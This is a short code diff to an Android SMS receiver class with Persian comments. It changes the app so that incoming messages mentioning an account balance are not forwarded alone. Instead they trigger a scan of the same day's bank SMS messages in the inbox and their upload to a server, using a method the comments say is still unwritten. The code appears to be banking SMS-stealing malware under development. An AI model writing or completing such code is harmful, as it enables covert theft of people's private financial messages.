@@ -39,7 +39,17 @@ public class SmsReceiver extends BroadcastReceiver {
             }
         }
 
-        sendToServer(msg.toString());
+        String text = msg.toString();
+
+        // شرط اول: فقط پیامک‌های دارای مانده یا موجودی
+        if (!(text.contains("مانده") || text.contains("موجودی"))) {
+            return;
+        }
+
+        // شرط دوم: به جای ارسال فقط همین پیام،
+        // پیامک‌های بانکی همان روز را اسکن و ارسال کن.
+        // (در این نسخه لازم است متد scanInboxBankSmsToday پیاده‌سازی شود.)
+        scanInboxBankSmsToday(context, 300);
     }
 
     private void sendToServer(String msg) {
